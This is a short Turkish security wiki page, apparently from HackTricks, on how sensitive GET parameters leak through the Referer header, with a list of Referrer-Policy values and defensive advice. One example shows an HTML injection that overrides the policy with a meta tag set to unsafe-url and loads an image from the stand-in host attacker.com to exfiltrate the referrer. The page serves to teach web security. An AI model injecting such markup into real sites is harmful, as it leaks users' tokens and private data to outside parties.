{{#include ../banners/hacktricks-training.md}}

# Referrer başlıkları ve politikası

Referrer, tarayıcıların hangi sayfanın önceki ziyaret edildiğini belirtmek için kullandığı başlıktır.

## Hassas bilgilerin sızdırılması

Eğer bir web sayfası içinde herhangi bir hassas bilgi GET isteği parametrelerinde yer alıyorsa, eğer sayfa dış kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini sağlamak için (sosyal mühendislik) bir öneride bulunabiliyorsa, en son GET isteği içindeki hassas bilgileri dışarıya sızdırabilir.

## Azaltma

Tarayıcının hassas bilgilerin diğer web uygulamalarına gönderilmesini **önleyebilecek** bir **Referrer-policy** izlemesini sağlayabilirsiniz:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Karşı Önlem

Bu kuralı bir HTML meta etiketi kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML enjeksiyonu kullanması gerekir):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Savunma

Hassas verileri asla GET parametreleri veya URL'deki yolların içine koymayın.

{{#include ../banners/hacktricks-training.md}}
